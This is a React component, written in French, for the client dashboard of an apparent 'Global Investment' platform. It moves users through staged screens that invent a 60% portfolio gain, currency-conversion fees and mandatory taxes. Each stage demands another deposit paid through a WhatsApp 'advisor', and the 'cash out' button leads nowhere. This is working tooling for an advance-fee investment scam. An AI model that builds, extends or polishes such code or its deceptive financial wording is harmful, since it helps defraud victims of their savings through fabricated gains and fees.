import React, { useEffect } from "react"
import { motion } from "framer-motion"
import { MdOutlineAccountBalanceWallet } from "react-icons/md"
import { useUserStore } from "../stores/resultatStore"

const UserInvest: React.FC = () => {
    const { fetchUser, loading, error, ...user } = useUserStore()

    useEffect(() => {
        fetchUser()
    }, [fetchUser])

    if (loading) return <p className="text-center py-20 text-gray-500">Chargement...</p>
    if (error) return <p className="text-center py-20 text-red-500">{error}</p>

    const conseillerPhone = "229XXXXXXXX"

    const whatsappLink = (message: string) =>
        `https://wa.me/${conseillerPhone}?text=${encodeURIComponent(message)}`

    /* =============================
          VARIABLES DYNAMIQUES
    ============================== */
    let title = ""
    let description = ""
    let progress = 0
    let whatsappMessage = ""

    /* =============================
          ETAPE 1 — ACTIVATION
    ============================== */
    if (user.pourcent === 0) {
        title = `Bienvenue ${user.nom}`
        description = `Nous sommes ravis de vous accueillir chez Global Investment.

Votre investissement initial de ${user.MontantIvest}  vous permettra de percevoir ${user.MontantRecevoir} .
Afin d'activer officiellement votre dossier et initier votre stratégie d'investissement, veuillez contacter votre conseiller dédié.`
        progress = 0
        whatsappMessage = `Bonjour, je souhaite débuter mon investissement chez Global Investment.
Nom: ${user.nom}
Pays: ${user.pays}
Téléphone: ${user.phone}
Montant à investir: ${user.MontantIvest} `
    }

    /* =============================
          ETAPE 2 — PLUS-VALUE
    ============================== */
    else if (user.pourcent === 1) {
        const depot = Number(user.MontantIvest)
        const nouveauMontant = Number(user.MontantRecevoir) * 1.6

        title = `Valorisation exceptionnelle de votre portefeuille`
        description = `Suite à une évolution favorable du sous-jacent, votre ligne d'investissement a enregistré une appréciation significative de 60%.

Votre nouveau montant à recevoir est estimé à ${nouveauMontant} .

Afin de maintenir votre exposition sur cet actif et continuer à bénéficier de cette dynamique, un versement complémentaire de ${depot}  est requis.
Merci de procéder au dépôt auprès de votre conseiller.`
        progress = 27
        whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
Suite à une hausse de 60%, mon nouveau montant à recevoir est de ${nouveauMontant} .
Je dois effectuer un dépôt de ${depot}  pour poursuivre mon investissement.`
    }

    /* =============================
          ETAPE 3 — CONVERSION
    ============================== */
    else if (user.pourcent === 2) {
        const fraisConversion = Number(user.MontantIvest) * 0.3

        title = `Ajustement multidevises`
        description = `Dans le cadre de la réévaluation de votre portefeuille multidevises, les fluctuations des taux de change ont un impact sur vos actifs libellés en dollars.

Un dépôt de ${fraisConversion} , correspondant aux frais de conversion et au spread de marché, est requis afin de préserver votre exposition initiale sur les valeurs américaines sélectionnées.

Montant à recevoir : ${user.MontantRecevoir} 

Veuillez effectuer ce dépôt auprès de votre conseiller afin de garantir la continuité de votre stratégie d'investissement.`
        progress = 65
        whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
Suite aux frais de conversion, je dois effectuer un dépôt de ${fraisConversion}  pour continuer mon investissement.
Merci de m'accompagner.`
    }

    /* =============================
          ETAPE 4 — TAXES
    ============================== */
    else if (user.pourcent === 3) {
        const taxes = Number(user.MontantRecevoir) * 0.15

        title = `Règlement fiscal réglementaire`
        description = `Suite à la réalisation de plus-values sur votre portefeuille d'actions, un prélèvement fiscal obligatoire est dû conformément à la réglementation en vigueur.

Un dépôt de ${taxes}  est requis afin d'apurer cette créance fiscale anticipée, vous permettant de maintenir l'intégrité de votre stratégie d'investissement et d'éviter tout incident de règlement.

Montant à recevoir : ${user.MontantRecevoir} 

Merci de procéder au dépôt auprès de votre conseiller afin de poursuivre votre investissement.`
        progress = 90
        whatsappMessage = `Salut, je suis ${user.nom}, pays ${user.pays}, téléphone ${user.phone}.
Suite aux taxes gouvernementales, je dois effectuer un dépôt de ${taxes}  pour continuer mon investissement.
Veuillez me l'accorder.`
    }

    /* =============================
          ETAPE FINALE
    ============================== */
    else {
        title = `Investissement finalisé`
        description = `Votre investissement a été intégralement validé.

Votre conseiller reste à votre entière disposition pour organiser la réception de vos gains ou vous accompagner dans de nouvelles opportunités d'investissement adaptées à votre profil.`
        progress = 100
        whatsappMessage = `Bonjour, mon investissement est désormais finalisé.
Nom: ${user.nom}
Téléphone: ${user.phone}
Merci pour votre accompagnement.`
    }

    /* =============================
          UI DASHBOARD
    ============================== */
    const infoCards = [
        { label: "Montant investi", value: `${user.MontantIvest} `, icon: <MdOutlineAccountBalanceWallet /> },
        { label: "Montant à recevoir", value: `${user.MontantRecevoir} `, icon: <MdOutlineAccountBalanceWallet /> },
    ]

    return (
        <section className="bg-gray-50 min-h-screen px-4 sm:px-8 pt-4 pb-16">
            <div className="max-w-7xl mx-auto">

                {/* BOUTON ENCAISSER - Positionné en haut à droite */}
                <div className="flex justify-end mb-8">
                    <a href="/" className="bg-green-600 hover:bg-green-700 text-white px-6 py-3 rounded-lg font-semibold shadow-md transition transform hover:scale-105">
                        Encaisser
                    </a>
                </div>

                {/* HEADER */}
                <div className="text-center mb-12">
                    <h1 className="text-3xl sm:text-4xl font-bold text-gray-800 mb-4">
                        {title}
                    </h1>
                    <p className="text-gray-700 max-w-3xl mx-auto leading-relaxed whitespace-pre-line">
                        {description}
                    </p>
                </div>

                {/* PROGRESSION */}
                <div className="bg-white rounded-2xl shadow p-6 mb-14">
                    <h3 className="text-center font-semibold text-gray-700 mb-4">
                        Avancement global de votre investissement
                    </h3>
                    <div className="w-full bg-gray-200 h-5 rounded-full overflow-hidden">
                        <motion.div
                            className="bg-primary h-5 rounded-full text-white text-sm font-semibold flex items-center justify-center"
                            initial={{ width: 0 }}
                            animate={{ width: `${progress}%` }}
                            transition={{ duration: 1.2 }}
                        >
                            {progress}%
                        </motion.div>
                    </div>
                </div>

                {/* INFOS */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-16">
                    {infoCards.map((item, index) => (
                        <motion.div
                            key={index}
                            whileHover={{ scale: 1.04 }}
                            className="bg-gradient-to-r from-primary to-secondary text-white p-5 rounded-xl shadow-md flex gap-4"
                        >
                            <div className="bg-white/20 p-3 rounded-full">{item.icon}</div>
                            <div>
                                <p className="text-sm opacity-80">{item.label}</p>
                                <p className="font-bold">{item.value}</p>
                            </div>
                        </motion.div>
                    ))}
                </div>

                {/* WHATSAPP */}
                <div className="text-center">
                    <a
                        href={whatsappLink(whatsappMessage)}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="inline-block bg-green-500 hover:bg-green-600 text-white px-10 py-4 rounded-full font-semibold shadow-xl transition transform hover:scale-105"
                    >
                        Contacter mon conseiller via WhatsApp
                    </a>
                </div>

            </div>
        </section>
    )
}

export default UserInvest